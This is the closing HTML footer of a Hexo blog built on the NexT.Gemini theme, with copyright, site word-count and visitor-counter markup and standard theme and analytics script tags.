  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">liberator</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">124k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">3:45</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
